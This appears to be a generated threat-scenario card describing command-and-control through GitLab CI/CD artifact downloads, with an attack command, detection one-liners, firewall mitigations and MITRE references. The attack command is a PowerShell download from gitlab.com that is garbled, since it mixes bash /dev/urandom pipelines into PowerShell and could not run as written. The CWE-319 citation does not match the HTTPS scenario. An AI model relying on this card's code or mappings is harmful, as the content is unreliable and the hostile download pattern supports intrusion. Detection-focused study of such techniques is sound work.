---
type: campaign
scenario_id: 442
tactic: Command and Control
technique: "T1071.001: Application Layer Protocol: Web Protocols"
technique_id: T1071.001
tags: [campaign, lotl, command_and_control]
---

# Using Invoke-WebRequest for C2 via GitLab CI/CD artifacts.

## Threat Description
Using Invoke-WebRequest for C2 via GitLab CI/CD artifacts.

## Attack Command
```
powershell -c "$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; Invoke-WebRequest -Uri https://gitlab.com/api/v4/projects/$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)/jobs/$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)/artifacts/$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt -OutFile C:\$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt"
```

## Detection Logic
Monitor Invoke-WebRequest GitLab: `wmic process where name='powershell.exe' get commandline | findstr gitlab.com`; Network traffic: `tshark -Y 'http.host contains gitlab.com'`.

## Mitigation
Restrict PowerShell: `Set-ExecutionPolicy Restricted`; Block GitLab API: `netsh advfirewall firewall add rule name='Block GitLab' dir=out action=block remoteip=172.65.251.78`.

## AI Training Prompt
Train AI to detect Invoke-WebRequest C2 via GitLab CI/CD artifacts by analyzing HTTP requests, GitLab API URLs, and file creation patterns; recommend API blocking.

## References
- MITRE ATT&CK T1071.001: https://attack.mitre.org/techniques/T1071/001/
- CWE-319: https://cwe.mitre.org/data/definitions/319.html
